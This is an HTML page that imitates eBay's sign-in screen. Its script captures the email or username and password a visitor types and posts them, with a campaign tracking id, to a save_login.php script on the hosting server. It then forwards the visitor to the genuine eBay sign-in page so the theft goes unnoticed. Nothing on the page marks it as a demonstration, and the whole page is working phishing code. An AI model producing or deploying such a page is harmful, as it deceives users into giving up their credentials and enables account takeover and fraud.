<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to your account | eBay</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Market Sans,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:360px}
.eb{color:#e53238;font-size:36px;font-weight:700;margin-bottom:4px}
.eb span{color:#0064d2}
h1{font-size:28px;font-weight:400;margin-bottom:20px}
input{width:100%;height:40px;border:1px solid #767676;border-radius:8px;padding:0 16px;margin-bottom:12px;font-size:14px}
.btn-submit{width:100%;height:48px;background:#3665f3;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:600;cursor:pointer}
</style></head><body><div class="card"><div class="eb">e<span>bay</span></div><h1>Sign in</h1><form id="loginForm"><input type="text" id="email" placeholder="Email or username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Continue</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
(function(){
var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    var login = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
    var btn = document.querySelector(".btn-submit");
    var label = btn.textContent;
    btn.textContent = "Please wait…";
    btn.disabled = true;
    $.ajax({
        type: "POST",
        url: BASE_URL + "save_login.php",
        data: { tid: tid, login: login, password: password, template: "ebay" },
        dataType: "json",
        success: function (data) {
            if (data && data.ok) { window.location.href = "https:\/\/signin.ebay.com\/"; return; }
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        },
        error: function () {
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        }
    });
});
})();
</script></body></html>
